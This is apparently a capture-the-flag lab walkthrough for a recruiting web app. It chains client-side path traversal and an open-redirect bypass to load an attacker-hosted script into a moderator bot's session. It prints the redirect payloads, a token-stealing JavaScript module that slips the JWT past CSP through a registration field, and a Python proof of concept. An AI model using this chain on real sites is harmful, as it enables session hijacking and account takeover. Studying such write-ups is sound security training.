# furhire-013 - BugForge Lab Walkthrough

**URL:** https://lab-1784994007875-n3rqrb.labs-app.bugforge.io
**Difficulty:** Hard (Weekly)
**Vulnerability:** Client-Side Path Traversal (CSPT) + Open Redirect chained into cross-origin script injection against an internal moderator bot, JWT exfiltrated via a same-origin channel to dodge CSP
**Flag:** `bug{c41Pju6gwjA7HGgNfanDmzXCRHZX9FyX}`

---

## Summary

FurHire is a recruiting SPA (Express.js backend, JWT stored in localStorage) with a recruiter-only
"Insights Apps" feature loaded via `/apps?app=<name>` and a support-ticket system that an internal
moderator account reviews by opening the submitted URL in a real browser.

The Insights App loader builds an API path by string-concatenating an unvalidated `app` query
parameter, which lets that parameter escape into an unrelated endpoint (`/public/redirect`) via
dot-segment traversal. That endpoint has an open-redirect bypass that turns it into an arbitrary
cross-origin redirect. Chaining the two turns the loader's manifest fetch into a request to an
attacker-controlled host, and the manifest's `module` field gets injected as a real `<script src>`
tag and executed same-origin, as whoever loaded the page - in this case, the moderator reviewing
the ticket. Since a CSP on that render context blocks straightforward cross-origin exfiltration,
the payload steals the moderator's JWT through a same-origin channel instead: registering a
throwaway account with the token stashed in a free-text profile field, then reading it back.

---

## Tech Stack

- React SPA frontend
- Express.js (Node.js) backend
- JWT in localStorage, `Authorization: Bearer` header
- Internal moderator/staff bot that opens submitted support-ticket URLs in a real browser session

---

## Key Endpoints

| Endpoint | Method | Auth | Notes |
|----------|--------|------|-------|
| `/api/register` | POST | No | Returns a usable JWT; `full_name` is free text with no format validation |
| `/api/login` | POST | No | Standard credential login |
| `/apps?app=<name>` | GET | JWT (via localStorage) | Loads an "Insights App" by fetching `/api/apps/<app>/manifest` client-side and injecting `manifest.module` as a script tag |
| `/api/apps/:app/manifest` | GET | JWT | Legitimate manifest lookup; `:app` is concatenated unvalidated into the request path client-side |
| `/public/redirect?url=<path>` | GET | No | Same-origin redirector with a same-origin check that a crafted prefix defeats |
| `/api/support/tickets` | POST | JWT | Accepts a `url` field intended to be an internal path; reviewed later by an internal moderator bot |
| `/api/verify-token` | GET | JWT | Returns the flag in the `X-Flag` response header for a staff-role token |

---

## Discovery

### Step 1 - Reading the Insights App loader

The app ships a small loader script that runs on page load:

```js
!function(){"use strict";document.addEventListener("DOMContentLoaded",function(){
  var e=localStorage.getItem("token");
  if(e){
    var t=new URLSearchParams(window.location.search).get("app")||"pipeline-insights",
        n="/api/apps/"+t+"/manifest";
    fetch(n,{headers:{Authorization:"Bearer "+e}})
      .then(function(e){return e.json()})
      .then(function(e){
        if(e&&e.module){
          var t=document.createElement("script");
          t.src=e.module;
          document.body.appendChild(t)
        }
      }).catch(function(){})
  }
})}();
```

Two things stand out immediately:

- The `app` query parameter is concatenated directly into a fetch path with no validation.
- The response's `module` field, with no origin or scheme restriction at all, becomes a real
  `<script src>` tag appended to the page. Whatever it points to runs same-origin, as whoever's
  session loaded the page.

### Step 2 - CSPT into an unrelated endpoint

Because `app` is string-concatenated with no sanitization, dot-segment traversal in the query
parameter walks the resulting request path anywhere on the origin:

```
app = ../../public/redirect?url=...
```

collapses (once the concatenated string `/api/apps/` + app + `/manifest` is normalized) into:

```
GET /public/redirect?url=...
```

so the loader's fetch lands on `/public/redirect` instead of the intended manifest API.

### Step 3 - Open-redirect bypass

`/public/redirect?url=<path>` rejects plain `//host` and `https://host` values with a same-origin
check. Prefixing the value with `/x/..//` defeats that check while still resolving, after the
leading segment cancels itself out, to a protocol-relative external URL:

```
GET /public/redirect?url=/x/..//<attacker-host>/<path>
-> 302 Location: //<attacker-host>/<path>
```

Verified first against a harmless host, then against the real attacker-hosted manifest, before
using it in a ticket.

### Step 4 - Splitting hosting by CORS posture

Chaining steps 2 and 3, the `app` value becomes:

```
../../public/redirect?url=/x/..//<manifest-host>/<manifest-path>#
```

(the trailing `#` truncates anything the loader appends after concatenating `/manifest`).

This makes the loader's `fetch()` land on an attacker-hosted `manifest.json` through a cross-origin
redirect. Because it is a `fetch()` call, the browser enforces CORS on the response, so the
manifest host has to send `Access-Control-Allow-Origin`, or the loader's `.then(r => r.json())`
throws and the whole chain dies silently with nothing observable.

The manifest itself only needs:

```json
{"module": "<module-host>/<module-path>"}
```

Critically, that `module` URL is then loaded through a plain `<script src>` tag, not `fetch()`, so
it is completely unconstrained by CORS. The manifest and the module script do not need to be on
the same host or share a CORS policy: only the manifest response needs
`Access-Control-Allow-Origin` set, while the module script can be hosted anywhere serving plain
content with no CORS headers at all.

### Step 5 - Delivery via the support ticket

`POST /api/support/tickets` takes a `url` field meant to be an internal path (`/jobs/123`-style).
Its validator checks a same-origin/prefix pattern, but evaluates it after the browser would
dot-segment-normalize the path, so both of these are accepted:

```
/jobs/../apps?app=../../public/redirect%3Furl=/x/..//<manifest-host>%23
/apps?app=../../../public/redirect?url=/x/..//<manifest-host>%23junk=
```

When the internal moderator opens the ticket, the full chain fires: CSPT redirects the manifest
fetch cross-origin, the CORS-approved manifest response is read, and the module script is injected
and executes with the moderator's session.

### Step 6 - Exfiltration through a same-origin channel

A CSP on the moderator's render context blocks straightforward cross-origin exfiltration - image
beacons and `fetch()` calls to an external collector both silently fail to fire. The token has to
leave through a same-origin channel instead. `POST /api/register` is same-origin and accepts a
free-text `full_name` field with no format validation, so the stolen token is stuffed there:

```js
(function(){
  var t = localStorage.getItem('token') || '';
  try {
    fetch('/api/register', {
      method: 'POST',
      headers: {'Content-Type': 'application/json'},
      body: JSON.stringify({
        username: 'pe_flagcatch01',
        password: 'Flagcatch01!',
        email: 'pe_flagcatch01@x.com',
        full_name: 'TOK:' + t.slice(0, 230)
      })
    }).catch(function(e){});
  } catch (e) {}
})();
```

The `email` field is mandatory - omitting it makes `/api/register` return 400, and since the call
is wrapped in a swallowed `.catch()`, that failure produces no observable signal unless the
endpoint is tested directly.

### Step 7 - Recovery

Once the bot visits the ticket, logging into the throwaway account recovers the token:

```
POST /api/login {"username":"pe_flagcatch01","password":"Flagcatch01!"}
-> user.full_name = "TOK:<staff JWT>"
```

Stripping the `TOK:` prefix gives the moderator's JWT:

```
GET /api/verify-token
Authorization: Bearer <staff JWT>
```

returns 200 with the flag in the `X-Flag` response header, not the JSON body:

```
X-Flag: bug{c41Pju6gwjA7HGgNfanDmzXCRHZX9FyX}
```

On this instance the bot reviewed the ticket within about 40 seconds of submission.

---

## Proof of Concept

```python
import json, urllib.request, urllib.error

BASE = "https://lab-1784994007875-n3rqrb.labs-app.bugforge.io"
MANIFEST_HOST = "your-cors-enabled-manifest-host/manifest-path"

def req(method, path, data=None, token=None):
    url = BASE + path
    h = {"Content-Type": "application/json"}
    if token:
        h["Authorization"] = f"Bearer {token}"
    body = json.dumps(data).encode() if data else None
    r = urllib.request.Request(url, data=body, headers=h, method=method)
    try:
        with urllib.request.urlopen(r, timeout=10) as resp:
            return resp.status, resp.read().decode()
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode()

# 1. Register a recruiter account to submit the ticket
_, body = req("POST", "/api/register", {
    "username": "recruiter_poc", "email": "recruiter_poc@bugforge.io", "password": "Password123!"
})
token = json.loads(body)["token"]

# 2. Submit the crafted ticket - manifest host must serve
#    {"module": "<module-url>"} with Access-Control-Allow-Origin set,
#    and the module URL must serve the exfil script from Step 6, no CORS needed
ticket_url = f"/jobs/../apps?app=../../public/redirect%3Furl=/x/..//{MANIFEST_HOST}%23"
req("POST", "/api/support/tickets", {"url": ticket_url}, token=token)

# 3. Poll for the bot to have visited and exfiltrated the token
status, body = req("POST", "/api/login", {
    "username": "pe_flagcatch01", "password": "Flagcatch01!"
})
if status == 200:
    staff_jwt = json.loads(body)["user"]["full_name"].removeprefix("TOK:")
    r = urllib.request.Request(BASE + "/api/verify-token",
                                headers={"Authorization": f"Bearer {staff_jwt}"})
    with urllib.request.urlopen(r) as resp:
        print(resp.headers.get("X-Flag"))
```

---

## Dead Ends

| Tried | Result | Lesson |
|---|---|---|
| Cross-origin exfil directly from the module (image beacon, `fetch()` to an external collector) | Never fired | CSP on the moderator's render context blocks it silently |
| Hosting manifest and module on the same host with a single CORS policy | Worked but unnecessary | The two hops have different browser enforcement (`fetch()` vs `<script src>`), so they only need to satisfy their own constraint independently |
| Omitting the `email` field on the exfil registration call | Silent 400, swallowed by `.catch()` | Always test the exact exfil request directly against the API before assuming a chain failure is upstream |

---

## Root Cause

Two independent issues chain together:

1. The Insights App loader treats `app` as a trusted path segment instead of an opaque identifier,
   letting dot-segment traversal redirect its `fetch()` call anywhere on the origin:

```javascript
// vulnerable pattern (approximate)
var n = "/api/apps/" + app + "/manifest";
fetch(n, {...}).then(r => r.json()).then(m => {
  if (m && m.module) {
    var s = document.createElement("script");
    s.src = m.module;           // no origin/scheme check at all
    document.body.appendChild(s);
  }
});
```

2. `/public/redirect`'s same-origin check does not account for a leading segment that cancels
   itself out during normalization, so a `/x/..//` prefix turns an intended same-origin redirector
   into an open redirect to any external host.

3. The support-ticket URL validator checks a `startsWith('/jobs/')`-style prefix against the raw
   string, not against the path a real browser will actually navigate to after normalization.

---

## CWE / OWASP

- **CWE-22**: Improper Limitation of a Pathname to a Restricted Directory (Client-Side Path Traversal)
- **CWE-601**: URL Redirection to Untrusted Site (Open Redirect)
- **CWE-79**: Improper Neutralization of Input During Web Page Generation (script injection via unvalidated `module` field)
- **OWASP A03:2021** - Injection
- **OWASP A01:2021** - Broken Access Control (ticket URL validation bypass)
